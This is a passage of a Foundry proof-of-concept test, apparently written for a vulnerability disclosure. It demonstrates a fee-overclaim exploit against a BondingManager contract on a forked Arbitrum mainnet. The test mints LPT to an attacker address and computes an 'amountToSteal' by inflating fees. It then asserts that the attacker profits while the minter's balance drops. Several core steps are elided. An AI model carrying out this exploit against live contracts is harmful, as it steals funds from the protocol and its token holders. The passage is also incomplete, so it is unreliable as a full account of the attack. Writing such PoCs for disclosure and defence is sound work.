...
// forge test --match-contract BondingManagerFeeOverclaimPoC --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 371152514
contract BondingManagerFeeOverclaimPoC is GovernorBaseTest {
    ...
    function test_feeOverclaim() public {
        address attacker = CHEATS.addr(ATTACKER_KEY);
        address someone = newAddr();

        /// attacker need 2000 lpt to execute the attack
        CHEATS.startPrank(address(MINTER));
        TOKEN.mint(attacker, 2000 * 1e18 + 2);
        ...
        uint256 attackGranularity = 1000 wei;
        uint256 inflateAmount = prevMinterBalance / attackGranularity;
        ...
        uint256 ticketAmount = attackGranularity;
        uint256 amountToSteal = attackGranularity * inflateAmount;
        ...
        console.log("received fees =", receivedFees / 1 ether, "ETH (wei:", receivedFees);
        assertEq(receivedFees, amountToSteal);

        uint256 profit = receivedFees - ticketAmount;
        console.log("profit =", profit / 1 ether, "ETH (wei:", profit);
        assertGt(profit, 0);
        ...
        assertLt(minterBalance, prevMinterBalance);
    }
